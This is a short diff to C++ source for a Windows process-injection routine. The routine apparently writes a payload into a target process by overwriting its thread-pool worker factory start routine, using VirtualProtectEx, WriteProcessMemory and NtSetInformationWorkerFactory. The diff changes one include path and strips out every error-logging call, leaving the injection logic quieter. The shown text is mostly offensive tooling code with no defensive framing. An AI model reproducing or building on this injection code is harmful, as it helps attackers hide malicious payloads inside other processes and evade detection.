@@ -1,4 +1,4 @@
-#include "injection.h"
+#include "include/injection.h"
 
 bool InjectViaWorkerFactoryStartRoutine(_In_ HANDLE targetProcess, _In_ HANDLE hWorkerFactory, _In_ void* localPayloadAddress, _In_ size_t payloadSize) {
 
@@ -43,7 +43,6 @@ bool InjectViaWorkerFactoryStartRoutine(_In_ HANDLE targetProcess, _In_ HANDLE h
 		nullptr);
 
 	if (status != ERROR_SUCCESS) {
-		NTAPI_ERR(NtQueryInformationWorkerFactory, status);
 		return false;
 	}
 
@@ -60,7 +59,6 @@ bool InjectViaWorkerFactoryStartRoutine(_In_ HANDLE targetProcess, _In_ HANDLE h
 		PAGE_READWRITE,
 		(PDWORD)&oldProtect)) {
 
-		WIN32_ERR(VirtualProtectEx(First Call));
 		return false;
 	}
 
@@ -71,7 +69,6 @@ bool InjectViaWorkerFactoryStartRoutine(_In_ HANDLE targetProcess, _In_ HANDLE h
 		payloadSize,
 		nullptr)) {
 
-		WIN32_ERR(WriteProcessMemory);
 		return false;
 	}
 
@@ -82,7 +79,6 @@ bool InjectViaWorkerFactoryStartRoutine(_In_ HANDLE targetProcess, _In_ HANDLE h
 		oldProtect,
 		(PDWORD)&oldProtect)) {
 
-		WIN32_ERR(VirtualProtectEx(Second Call));
 		return false;
 	}
 
@@ -101,7 +97,6 @@ bool InjectViaWorkerFactoryStartRoutine(_In_ HANDLE targetProcess, _In_ HANDLE h
 		sizeof(uint32_t));
 
 	if (status != ERROR_SUCCESS) {
-		NTAPI_ERR(NtSetInformationWorkerFactory, status);
 		return false;
 	}
 
